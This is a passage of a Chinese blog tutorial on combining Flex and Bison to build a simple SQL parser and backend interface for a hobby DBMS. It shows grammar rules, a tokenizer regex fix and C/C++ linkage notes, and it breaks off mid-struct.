<span class="n">expr</span> <span class="o">:</span> <span class="n">expr</span> <span class="sc">'+'</span> <span class="n">expr</span> <span class="p">{</span> <span class="n">printf</span><span class="p">(</span><span class="s">"Result: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="err">$</span><span class="mf">1.</span><span class="n">intval</span> <span class="o">+</span> <span class="err">$</span><span class="mf">3.</span><span class="n">intval</span><span class="p">);</span> <span class="p">}</span>
     <span class="o">|</span> <span class="n">expr</span> <span class="sc">'-'</span> <span class="n">expr</span> <span class="p">{</span> <span class="n">printf</span><span class="p">(</span><span class="s">"Result: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="err">$</span><span class="mf">1.</span><span class="n">intval</span> <span class="o">-</span> <span class="err">$</span><span class="mf">3.</span><span class="n">intval</span><span class="p">);</span> <span class="p">}</span>
     <span class="o">|</span> <span class="n">expr</span> <span class="sc">'*'</span> <span class="n">expr</span> <span class="p">{</span> <span class="n">printf</span><span class="p">(</span><span class="s">"Result: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="err">$</span><span class="mf">1.</span><span class="n">intval</span> <span class="o">*</span> <span class="err">$</span><span class="mf">3.</span><span class="n">intval</span><span class="p">);</span> <span class="p">}</span>
     <span class="o">|</span> <span class="n">expr</span> <span class="sc">'/'</span> <span class="n">expr</span> <span class="p">{</span> <span class="n">printf</span><span class="p">(</span><span class="s">"Result: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="err">$</span><span class="mf">1.</span><span class="n">intval</span> <span class="o">/</span> <span class="err">$</span><span class="mf">3.</span><span class="n">intval</span><span class="p">);</span> <span class="p">}</span>
     <span class="o">|</span> <span class="n">NUMBER</span>        <span class="p">{</span> <span class="err">$$</span> <span class="o">=</span> <span class="err">$</span><span class="mf">1.</span><span class="n">intval</span><span class="p">;</span> <span class="p">}</span>
     <span class="p">;</span>

<span class="o">%%</span>
<span class="p">......</span><span class="err">后文省略</span>
</code></pre></div></div> <h2 id="例子-1">例子</h2> <p>这里是单个YACC程序，没有配合lex。用户手动输入代替lex词法分析之后产生的token stream.</p> <p>所以手动定义了yylex()，后续lex和YACC配合时，yylex()由lex自动生成。</p> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">%</span><span class="p">{</span>
    <span class="cp">#include</span><span class="cpf">&lt;ctype.h&gt;</span><span class="cp">
</span>    <span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span>    <span class="kt">int</span> <span class="n">yylex</span><span class="p">();</span>
    <span class="kt">void</span> <span class="n">yyerror</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span><span class="p">);</span>
<span class="o">%</span><span class="p">}</span>

<span class="o">%</span><span class="n">token</span> <span class="n">NUMBER</span>
<span class="o">%</span><span class="n">left</span> <span class="sc">'+'</span> <span class="sc">'-'</span>
<span class="o">%</span><span class="n">left</span> <span class="sc">'*'</span> <span class="sc">'/'</span>

<span class="o">%%</span> <span class="c1">// 这里是产生式 expr是非终结符，NUMBER是终结符</span>
<span class="n">expr</span> <span class="o">:</span> <span class="n">expr</span> <span class="sc">'+'</span> <span class="n">expr</span>    <span class="p">{</span><span class="n">printf</span><span class="p">(</span><span class="s">"Identified [add].</span><span class="se">\n</span><span class="s">"</span><span class="p">);}</span>
     <span class="o">|</span> <span class="n">expr</span> <span class="sc">'-'</span> <span class="n">expr</span>    <span class="p">{</span><span class="n">printf</span><span class="p">(</span><span class="s">"Identified [sub].</span><span class="se">\n</span><span class="s">"</span><span class="p">);}</span>
     <span class="o">|</span> <span class="n">expr</span> <span class="sc">'*'</span> <span class="n">expr</span>    <span class="p">{</span><span class="n">printf</span><span class="p">(</span><span class="s">"Identified [multiply].</span><span class="se">\n</span><span class="s">"</span><span class="p">);}</span>
     <span class="o">|</span> <span class="n">expr</span> <span class="sc">'/'</span> <span class="n">expr</span>    <span class="p">{</span><span class="n">printf</span><span class="p">(</span><span class="s">"Identified [divide].</span><span class="se">\n</span><span class="s">"</span><span class="p">);}</span>
     <span class="o">|</span> <span class="sc">'('</span> <span class="n">expr</span> <span class="sc">')'</span>     <span class="p">{</span><span class="n">printf</span><span class="p">(</span><span class="s">"Identified [round bracket].</span><span class="se">\n</span><span class="s">"</span><span class="p">);}</span>
     <span class="o">|</span> <span class="n">NUMBER</span>           <span class="p">{</span><span class="n">printf</span><span class="p">(</span><span class="s">"Identified [NUMBER].</span><span class="se">\n</span><span class="s">"</span><span class="p">);}</span>
     <span class="p">;</span>
<span class="o">%%</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
    <span class="k">return</span> <span class="n">yyparse</span><span class="p">();</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">yylex</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
    <span class="kt">int</span> <span class="n">c</span><span class="p">;</span>
    <span class="k">while</span><span class="p">((</span><span class="n">c</span> <span class="o">=</span> <span class="n">getchar</span><span class="p">())</span> <span class="o">==</span> <span class="sc">' '</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">isdigit</span><span class="p">(</span><span class="n">c</span><span class="p">)){</span>
        <span class="n">ungetc</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
        <span class="n">scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">yylval</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">NUMBER</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span><span class="p">(</span><span class="n">c</span> <span class="o">==</span> <span class="sc">'\n'</span><span class="p">)</span><span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">return</span> <span class="n">c</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">yyerror</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">){</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">s</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div> <p>文件名为<code class="language-plaintext highlighter-rouge">myparser.y</code>，运行步骤(Windows):</p> <ol> <li>编译.y程序: <code class="language-plaintext highlighter-rouge">bison .\myparser.y</code></li> <li>编译生成的C程序: <code class="language-plaintext highlighter-rouge">gcc .\myparser.tab.c</code></li> <li>执行生成的可执行文件: <code class="language-plaintext highlighter-rouge">.\a.exe</code></li> </ol> <p>输入字符串(其实是token stream)，可以识别表达式。</p> <p>这里是main()函数调用yyparse()函数</p> <p>而yyparse()将调用yylex()函数 <em>(这里因为只由一个YACC程序组成，所以yylex()函数是用户自定义的)</em> 获取输入的token，并语法分析</p> <p>匹配到产生式就执行对应的代码段。</p> <h1 id="lex和yacc联合编程">Lex和YACC联合编程</h1> <p>没啥区别，主要在于yylval和yylex()这些变量/函数的链接。</p> <h2 id="yylval在lex程序中的赋值">yylval在Lex程序中的赋值</h2> <p>yylval是在YACC程序中定义的，而yylex()是在Lex程序中自动生成的(也就是{patterns} {actions}里面的actions)</p> <p>当前目录下的<code class="language-plaintext highlighter-rouge">test</code>文件夹中测试了两个文件<code class="language-plaintext highlighter-rouge">test.l</code>和<code class="language-plaintext highlighter-rouge">test.y</code></p> <p>要保证Lex程序中能给<code class="language-plaintext highlighter-rouge">yylval</code>赋值，从而让YACC程序进一步操作，就要在Lex程序中添加YACC程序的头文件（<strong>因为<code class="language-plaintext highlighter-rouge">yylval</code>是在YACC程序中定义的</strong>）</p> <p>所以编译YACC程序就要顺便生成YACC的头文件，以便Lex程序包含，从而使用<code class="language-plaintext highlighter-rouge">yylval</code>变量。</p> <h2 id="yylex在yacc程序中被调用">yylex()在YACC程序中被调用</h2> <p>前文提到过，yylex()是在Lex程序中根据模式串自动生成的函数。</p> <p>YACC程序中，yyparse()将自动调用yylex()程序(这也是为什么YACC单独运行时，需要用户自定义yylex()函数)</p> <p>所以YACC源程序中要声明yylex()函数。</p> <h2 id="例子-2">例子</h2> <p>其次，上述Lex单独运行和YACC单独运行时，都自定义了main函数。</p> <p>下面的例子是main函数定义在<code class="language-plaintext highlighter-rouge">test.y</code>中，当然也可以在其他文件中定义main()，然后调用<code class="language-plaintext highlighter-rouge">yyparse()</code></p> <p><code class="language-plaintext highlighter-rouge">test.l</code>和<code class="language-plaintext highlighter-rouge">test.y</code>(自己写的一个测试样例，内容很简单，只需要理解如何编译他们)</p> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// in test.l</span>
<span class="o">%</span><span class="p">{</span>
<span class="cp">#include</span> <span class="cpf">"test.tab.h"</span><span class="cp">
</span><span class="o">%</span><span class="p">}</span>

<span class="n">NUM</span> <span class="p">[</span><span class="mi">1</span><span class="o">-</span><span class="mi">9</span><span class="p">]</span><span class="o">+</span><span class="p">[</span><span class="mi">0</span><span class="o">-</span><span class="mi">9</span><span class="p">]</span><span class="o">*|</span><span class="mi">0</span>

<span class="o">%%</span>

<span class="p">{</span><span class="n">NUM</span><span class="p">}</span>		                <span class="k">return</span> <span class="n">NUM</span><span class="p">;</span>
<span class="p">[</span> <span class="err">\</span><span class="n">t</span><span class="p">]</span><span class="o">+</span>                     <span class="cm">/* ignore whitespace */</span><span class="p">;</span>
<span class="p">.</span>

<span class="o">%%</span>


<span class="kt">int</span> <span class="nf">yywrap</span><span class="p">(){</span>
<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <p>看一下<code class="language-plaintext highlighter-rouge">test.y</code>:</p> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">%</span><span class="p">{</span>
    <span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span>    <span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span>    <span class="kt">int</span> <span class="n">yylex</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
    <span class="kt">void</span> <span class="n">yyerror</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">);</span>
<span class="o">%</span><span class="p">}</span>

<span class="o">%</span><span class="n">token</span> <span class="n">NUM</span>

<span class="o">%%</span>
<span class="n">expr</span><span class="o">:</span>
    <span class="n">NUM</span> <span class="p">{</span><span class="n">printf</span><span class="p">(</span><span class="s">"This is a number.</span><span class="se">\n</span><span class="s">"</span><span class="p">)};</span>
    <span class="p">;</span>
<span class="o">%%</span>
<span class="kt">void</span> <span class="nf">yyerror</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">){</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="s">"error:%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">str</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="c1">// 后续这里可以注释掉，别的地方调用yyparse()</span>
<span class="p">{</span>
    <span class="n">yyparse</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div></div> <p>大体上是识别数字。</p> <p>首先要编译<code class="language-plaintext highlighter-rouge">test.l</code>和<code class="language-plaintext highlighter-rouge">test.y</code>文件，下面用Flex和Bison演示。</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>flex test.l
bison <span class="nt">-d</span> test.y
</code></pre></div></div> <p>不同的点在于bison命令行参数的<code class="language-plaintext highlighter-rouge">-d</code>，这里会生成<code class="language-plaintext highlighter-rouge">test.tab.c</code>和<code class="language-plaintext highlighter-rouge">test.tab.h</code>文件，从而让lex程序包含yylval。</p> <p>接下来两个文件编译</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc <span class="nt">-o</span> <span class="nb">test </span>test.tab.c lex.yy.c
</code></pre></div></div> <p>这样就能够生成<code class="language-plaintext highlighter-rouge">test.exe</code>文件了，执行是没问题的。(上述是纯C文件的编译)</p> <h2 id="模块化">模块化</h2> <p>问题在于，我并不想在<code class="language-plaintext highlighter-rouge">test.tab.c</code>中就直接进入入口<code class="language-plaintext highlighter-rouge">main()</code>，我可能需要给项目分模块，词法分析、语法分析只是其中一块而已。</p> <p>这时候就需要将<code class="language-plaintext highlighter-rouge">test.y</code>中的<code class="language-plaintext highlighter-rouge">main()</code>删除了，毕竟程序的入口<code class="language-plaintext highlighter-rouge">main()</code>我们需要放在别的地方。</p> <p>这样会有两个新问题：</p> <ol> <li>那在别的文件中，怎么调用词法分析、语法分析这一块内容呢？</li> <li>上述的测试都是在标准输入/输出中进行的，如果我有一个<code class="language-plaintext highlighter-rouge">shell</code>,这个<code class="language-plaintext highlighter-rouge">shell</code>从标准输入中读取字符串，再交给<code class="language-plaintext highlighter-rouge">编译器</code>这个模块来解析，岂不是lex和YACC要传入字符串了（而不是从标准输入中读取）？</li> </ol> <p>其实都是很好解决的问题：</p> <p>Flex官方文档给出了如下说明:</p> <p><code class="language-plaintext highlighter-rouge">Three routines are available for setting up input buffers for scanning in-memory strings instead of files. </code></p> <p>其中一个就是<code class="language-plaintext highlighter-rouge">yy_scan_string(const char *str)</code>，这意味着，可以将指定的字符串作为Lex的输入流，然后yylex()函数将从这个输入流中进行词法分析，再将分析结果传给yyparse().</p> <p>所以，<code class="language-plaintext highlighter-rouge">test.l</code>和<code class="language-plaintext highlighter-rouge">test.y</code>这一个模块，可以被外部调用，只需要利用好<code class="language-plaintext highlighter-rouge">yy_scan_string()</code>和<code class="language-plaintext highlighter-rouge">yyparse()</code>（因为yyparse()内部会调用yylex()）即可。</p> <p>下面是一个例子<code class="language-plaintext highlighter-rouge">main.cpp</code>:</p> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//很重要</span>
<span class="kt">int</span> <span class="nf">yyparse</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span> <span class="c1">// 从别的文件找这些函数</span>
<span class="kt">void</span> <span class="nf">yy_scan_string</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">str</span><span class="p">);</span>


<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">inputLine</span><span class="p">;</span>

    <span class="c1">// 从标准输入读取一行</span>
    <span class="n">std</span><span class="o">::</span><span class="n">getline</span><span class="p">(</span><span class="n">std</span><span class="o">::</span><span class="n">cin</span><span class="p">,</span> <span class="n">inputLine</span><span class="p">);</span>

    <span class="c1">// 将输入字符串传递给词法分析器</span>
    <span class="n">yy_scan_string</span><span class="p">(</span><span class="n">inputLine</span><span class="p">.</span><span class="n">c_str</span><span class="p">());</span> <span class="c1">// c风格的string，其实就是char*</span>

    <span class="c1">// 调用语法分析器</span>
    <span class="n">yyparse</span><span class="p">();</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <p><strong>注意！CPP和C混合编程，C和C++编译器会有不太一样的表现，这里是关于名字改编的问题，上述代码在test文件夹下，用下面的编译命令能够正常运行</strong></p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>flex test.l
bison <span class="nt">-d</span> test.y
g++ <span class="nt">-o</span> lex.yy.c test.tab.c main.cpp
</code></pre></div></div> <p>在CPP文件中，如果要用到<code class="language-plaintext highlighter-rouge">yyparse()</code>和<code class="language-plaintext highlighter-rouge">yy_scan_string()</code>这些来自C文件的函数，就要加上<code class="language-plaintext highlighter-rouge">extern "C"</code>的关键字。</p> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//很重要</span>
<span class="k">extern</span> <span class="s">"C"</span><span class="p">{</span>
    <span class="kt">int</span> <span class="n">yyparse</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span> <span class="c1">// 从别的文件找这些函数</span>
    <span class="kt">void</span> <span class="n">yy_scan_string</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">str</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div> <p>自己注意就行，总之能够调用这两个函数就可以了。</p> <p>如果要在<code class="language-plaintext highlighter-rouge">parser.y</code>中用到cpp的某些特性，比如类或者某些集合，那么你就需要保证你用<code class="language-plaintext highlighter-rouge">lex</code>和<code class="language-plaintext highlighter-rouge">yacc</code>编译的文件是<code class="language-plaintext highlighter-rouge">.cpp/.hpp</code>的，从而尽量避免C和CPP混合编程带来的<code class="language-plaintext highlighter-rouge">undefine reference</code>的链接问题。</p> <p>要么纯C要么纯CPP，C和CPP混合的话，还是挺麻烦的，除非你能做到完美分离前后端。</p> <p>如果你要纯CPP的话，<code class="language-plaintext highlighter-rouge">flex</code>源文件可以在开头加上<code class="language-plaintext highlighter-rouge">%option outfile = "lex.yy.cpp"</code>，这样<code class="language-plaintext highlighter-rouge">flex lex.l</code>编译出来的文件就是<code class="language-plaintext highlighter-rouge">lex.yy.cpp</code>(可改名)</p> <p>使用<code class="language-plaintext highlighter-rouge">yyparse()</code>和<code class="language-plaintext highlighter-rouge">yy_scan_string()</code>的话，就不用加上<code class="language-plaintext highlighter-rouge">extern "C"</code>的关键字了。</p> <h1 id="数据库设计">数据库设计</h1> <h2 id="mydbms-architecture">myDBMS Architecture</h2> <p>概览如下图:</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-05-17/myArchitecture-480.webp 480w,/assets/img/2024-05-17/myArchitecture-800.webp 800w,/assets/img/2024-05-17/myArchitecture-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2024-05-17/myArchitecture.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p><code class="language-plaintext highlighter-rouge">Shell</code>和<code class="language-plaintext highlighter-rouge">Compiler</code>部分属于<code class="language-plaintext highlighter-rouge">Front-End</code>部分。</p> <p><code class="language-plaintext highlighter-rouge">Engine</code>以及后续的部分属于<code class="language-plaintext highlighter-rouge">Back-End</code>部分。</p> <p>这一点参考的官方<a href="https://www.sqlite.org/arch.html">Architecture of SQLite</a></p> <h2 id="编译器设计">编译器设计</h2> <h3 id="tokenizer">Tokenizer</h3> <p>lex程序比较简单，没什么特别需要注意的地方，本人遇到的两个bug需要注意。</p> <p>一个是关于NUMBER的正则表达式，之前使用的是:</p> <p><code class="language-plaintext highlighter-rouge">[-+]?[1-9][0-9]*</code>，其实这个表达式不包含0，一定要注意多测试前端的问题。</p> <p>后续修复这样:</p> <p><code class="language-plaintext highlighter-rouge">[-+]?[0-9]+</code></p> <p>另一个是关于STRING的正则表达式，很容易想到:</p> <p><code class="language-plaintext highlighter-rouge">'.*'</code></p> <p>也就是两个单引号包含一个任意字符闭包。</p> <p>看起来没什么问题，但是实际上如果出现多个字符:</p> <p><code class="language-plaintext highlighter-rouge">SELECT * FROM table WHERE name = 'test' AND money = 'infinity';</code></p> <p>将会出现难以调试的bug。有可能会把<code class="language-plaintext highlighter-rouge">test' AND money = 'infinity</code>作为两个单引号的内容，导致bug。</p> <p>建议改成:</p> <p><code class="language-plaintext highlighter-rouge">"'"[^']*"'"</code></p> <h3 id="parser">Parser</h3> <p>在YACC程序，语法分析主要写一些文法产生式，还有对应的规则。</p> <p>我设计语句如下：</p> <p>开始语句为<code class="language-plaintext highlighter-rouge">startStatement</code>，其语法树如下:</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-05-17/startStatement-480.webp 480w,/assets/img/2024-05-17/startStatement-800.webp 800w,/assets/img/2024-05-17/startStatement-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2024-05-17/startStatement.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>分为六大部分，<code class="language-plaintext highlighter-rouge">systemControl</code>,<code class="language-plaintext highlighter-rouge">createStatement</code>,<code class="language-plaintext highlighter-rouge">queryStatement</code>,<code class="language-plaintext highlighter-rouge">insertStatement</code>,<code class="language-plaintext highlighter-rouge">updateStatement</code>,<code class="language-plaintext highlighter-rouge">deleteStatement</code>。</p> <h4 id="systemcontrol">systemControl</h4> <p>主要是对数据库和表进行创建、删除、使用、列举:</p> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* System-Control Statements */</span>
<span class="n">systemControl</span><span class="o">:</span>
	<span class="n">CREATE</span> <span class="n">DATABASE</span> <span class="n">databaseName</span> <span class="sc">';'</span>
	<span class="o">|</span> <span class="n">SHOW</span> <span class="n">DATABASES</span> <span class="sc">';'</span>
	<span class="o">|</span> <span class="n">USE</span> <span class="n">databaseName</span> <span class="sc">';'</span>
	<span class="o">|</span> <span class="n">DROP</span> <span class="n">DATABASE</span> <span class="n">databaseName</span> <span class="sc">';'</span>
	<span class="o">|</span> <span class="n">SHOW</span> <span class="n">TABLES</span> <span class="sc">';'</span>
	<span class="o">|</span> <span class="n">DROP</span> <span class="n">TABLE</span> <span class="n">tableName</span> <span class="sc">';'</span>
	<span class="p">;</span>

<span class="n">databaseName</span><span class="o">:</span>
	<span class="n">ID</span>
	<span class="p">;</span>

<span class="n">tableName</span><span class="o">:</span>
	<span class="n">ID</span>
	<span class="p">;</span>
</code></pre></div></div> <h4 id="createstatement">createStatement</h4> <p>主要是在已经选中的数据库中创建表:</p> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Create Statement.</span>
<span class="n">createStatement</span><span class="o">:</span>
	<span class="n">CREATE</span> <span class="n">TABLE</span> <span class="n">tableName</span> <span class="sc">'('</span><span class="n">columnsDefinition</span><span class="sc">')'</span> <span class="sc">';'</span>
	<span class="p">;</span>

<span class="n">columnsDefinition</span><span class="o">:</span>
	<span class="n">columnName</span> <span class="n">columnType</span>
	<span class="o">|</span> <span class="n">columnName</span> <span class="n">columnType</span> <span class="sc">','</span> <span class="n">columnsDefinition</span>
	<span class="p">;</span>

<span class="n">columnName</span><span class="o">:</span>
	<span class="n">ID</span>
	<span class="p">;</span>

<span class="n">columnType</span><span class="o">:</span>
	<span class="n">INT</span>
	<span class="o">|</span> <span class="n">CHAR</span> <span class="sc">'('</span> <span class="n">NUMBER</span> <span class="sc">')'</span>
	<span class="p">;</span>
</code></pre></div></div> <h4 id="querystatement">queryStatement</h4> <p>主要是在已经选中的数据库中进行查询:</p> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Query Statement.</span>
<span class="n">queryStatement</span><span class="o">:</span>
	<span class="n">SELECT</span> <span class="n">columnNames</span> <span class="n">FROM</span> <span class="n">tableNames</span> <span class="sc">';'</span>
	<span class="o">|</span> <span class="n">SELECT</span> <span class="n">columnNames</span> <span class="n">FROM</span> <span class="n">tableNames</span> <span class="n">WHERE</span> <span class="n">conditions</span> <span class="sc">';'</span>
	<span class="p">;</span>

<span class="n">columnNames</span><span class="o">:</span>
	<span class="sc">'*'</span>
	<span class="o">|</span> <span class="n">columnName</span>
	<span class="o">|</span> <span class="n">columnName</span> <span class="sc">','</span> <span class="n">columnNames</span>
	<span class="p">;</span>

<span class="n">tableNames</span><span class="o">:</span>
	<span class="n">tableName</span>
	<span class="o">|</span> <span class="n">tableName</span> <span class="sc">','</span> <span class="n">tableNames</span>
	<span class="p">;</span>

<span class="c1">// Top-level conditions rules</span>
<span class="n">conditions</span><span class="o">:</span>
    <span class="n">condition</span>
    <span class="o">|</span> <span class="sc">'('</span> <span class="n">conditions</span> <span class="sc">')'</span>
    <span class="o">|</span> <span class="n">conditions</span> <span class="n">AND</span> <span class="n">conditions</span>
    <span class="o">|</span> <span class="n">conditions</span> <span class="n">OR</span> <span class="n">conditions</span>
    <span class="p">;</span>

<span class="c1">// Single condition rule</span>
<span class="n">condition</span><span class="o">:</span>
    <span class="n">columnName</span> <span class="k">operator</span> <span class="n">rightOperand</span>
    <span class="p">;</span>

<span class="c1">// Operator definitions</span>
<span class="k">operator</span><span class="o">:</span>
    <span class="sc">'&lt;'</span>
    <span class="o">|</span> <span class="sc">'&gt;'</span>
    <span class="o">|</span> <span class="sc">'='</span>
    <span class="o">|</span> <span class="sc">'!'</span> <span class="sc">'='</span>
    <span class="o">|</span> <span class="sc">'&lt;'</span> <span class="sc">'&gt;'</span>
    <span class="p">;</span>

<span class="c1">// Right operand can be a number or a string</span>
<span class="n">rightOperand</span><span class="o">:</span>
    <span class="n">NUMBER</span>
    <span class="o">|</span> <span class="n">STRING</span>
    <span class="p">;</span>
</code></pre></div></div> <p>需要特别注意的是conditions的语法树，后续对应的规则比较复杂。</p> <h4 id="insertstatement">insertStatement</h4> <p>主要是在已经选中的数据库中进行插入:</p> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Insert statement.</span>
<span class="n">insertStatement</span><span class="o">:</span>
	<span class="n">INSERT</span> <span class="n">INTO</span> <span class="n">tableName</span> <span class="sc">'('</span> <span class="n">columnNames</span> <span class="sc">')'</span> <span class="n">VALUES</span> <span class="sc">'('</span> <span class="n">values</span> <span class="sc">')'</span> <span class="sc">';'</span>
	<span class="o">|</span> <span class="n">INSERT</span> <span class="n">INTO</span> <span class="n">tableName</span> <span class="n">VALUES</span> <span class="sc">'('</span> <span class="n">values</span> <span class="sc">')'</span> <span class="sc">';'</span>
	<span class="p">;</span>

<span class="n">values</span><span class="o">:</span>
	<span class="n">value</span>
	<span class="o">|</span> <span class="n">value</span> <span class="sc">','</span> <span class="n">values</span>
	<span class="p">;</span>

<span class="n">value</span><span class="o">:</span>
	<span class="n">NUMBER</span>
	<span class="o">|</span> <span class="n">STRING</span>
	<span class="p">;</span>
</code></pre></div></div> <h4 id="updatestatement">updateStatement</h4> <p>主要是在已经选中的数据库中进行更新:</p> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Update statement.</span>
<span class="n">updateStatement</span><span class="o">:</span>
	<span class="n">UPDATE</span> <span class="n">tableName</span> <span class="n">SET</span> <span class="n">assignments</span> <span class="n">WHERE</span> <span class="n">conditions</span> <span class="sc">';'</span>
	<span class="p">;</span>

<span class="n">assignments</span><span class="o">:</span>
	<span class="n">assignment</span>
	<span class="o">|</span> <span class="n">assignment</span> <span class="sc">','</span> <span class="n">assignments</span>
	<span class="p">;</span>

<span class="n">assignment</span><span class="o">:</span>
	<span class="n">columnName</span> <span class="sc">'='</span> <span class="n">value</span>
	<span class="p">;</span>
</code></pre></div></div> <h4 id="deletestatement">deleteStatement</h4> <p>主要是在已经选中的数据库中进行删除:</p> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Delete statement.</span>
<span class="n">deleteStatement</span><span class="o">:</span>
	<span class="n">DELETE</span> <span class="n">FROM</span> <span class="n">tableName</span> <span class="sc">';'</span>
	<span class="o">|</span> <span class="n">DELETE</span> <span class="n">FROM</span> <span class="n">tableName</span> <span class="n">WHERE</span> <span class="n">conditions</span> <span class="sc">';'</span>
	<span class="p">;</span>
</code></pre></div></div> <h2 id="后端接口设计">后端接口设计</h2> <p>前端是lex和yacc共同分析输入语句，识别到对应的文法后，执行对应的代码。</p> <p>这里设计<code class="language-plaintext highlighter-rouge">Database.h</code>暴露给前端一些接口用于内核执行数据库语句。</p> <p>在语法分析的同时，将一些链表结构或者树结构创建，所以需要声明一些结点，方便后端执行。</p> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define STATE_SYS 0
#define STATE_DB 1 // 选中数据库的状态才能增删改查
</span>
<span class="k">struct</span> <span class="nc">columnNode</span><span class="p">{</span>
    <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">columnName</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">charLength</span><span class="p">;</span>
    <span class="k">struct</span> <span class="nc">columnNode</span><span class="o">*</span> <span class="n">next</span> <span class="o">=</span> <span class="nb">nullptr</span><span class="p">;</span>
<span class="p">};</span>

<span class="c1">// for SELECT node;</span>
<span class="k">struct</span> <span class="nc">tableNode</span><span class="p">{</span>
    <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">tableName</span><span class="p">;</span>
    <span class="k">struct</span> <span class="nc">tableNode</span><span class="o">*</span> <span class="n">next</span> <span class="o">=</span> <span class="nb">nullptr</span><span class="p">;</span>
<span class="p">};</span>

<span class="k">struct</span> <span class="nc">conditionNode</span><span class="p">{</span>
    <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">columnName</span><span class="p">;</span>
    <span class="c1">// 如果op是AND或者OR，说明是一个中间结点，有左右子树，cloumnName和value为空。</span>
    <span class="c1">// 如果这个结点是叶子节点，则代表这是一个表达式结点，columnName op value;</span>
    <span class="k">enum</span> <span class="n">op</span><span class="p">{</span>
        <span class="n">AND</span><span class="p">,</span> <span class="n">OR</span><span class="p">,</span> <span class="n">GREATER</span><span class="p">,</span> <span class="n">LESS</span><span class="p">,</span> <span class="n">EQUAL</span><span class="p">,</span> <span class="n">NOT_EQUAL</span>
    <span class="p">}</span><span class="n">op</span><span class="p">;</span>
    <span class="k">enum</span> <span class="n">rightOperandType</span><span class="p">{</span>
        <span class="n">INT</span><span class="p">,</span> <span class="n">STRING</span>
